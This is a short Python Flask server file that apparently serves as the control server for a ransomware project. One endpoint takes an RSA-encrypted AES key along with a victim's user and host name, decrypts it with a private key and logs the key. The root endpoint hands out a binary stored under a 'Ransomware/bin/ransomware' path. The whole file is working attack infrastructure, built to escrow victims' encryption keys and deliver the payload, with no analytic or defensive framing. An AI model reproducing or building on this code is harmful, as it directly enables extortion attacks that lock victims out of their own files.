from flask import Flask, request, jsonify, send_file
import base64
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import binascii


app = Flask(__name__)


def decode_key(aes_key_encoded_base64: str):
    with open("./config/private.pem", "rb") as f:
        private_key = RSA.import_key(f.read())
    
    encrypted_key = base64.b64decode(aes_key_encoded_base64)

    cipher_rsa = PKCS1_OAEP.new(private_key)
    aes_key = cipher_rsa.decrypt(encrypted_key)
    return aes_key

@app.route('/aes-encryption-key', methods=['POST'])
def receive_key():
    data = request.get_json()
    aes_key_encoded_base64 = data.get('aes_key')
    host_name = data.get('host_name')
    user =  data.get('user')

    if aes_key_encoded_base64:
        aes_key = decode_key(aes_key_encoded_base64)
        print(f"{user}@{host_name}: {binascii.hexlify(aes_key).decode()}")
        return '', 200
    else:
        return '', 400

@app.route('/', methods=['GET'])
def index():
    return send_file("/home/azazhel/Documents/Ransomware/bin/ransomware")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)

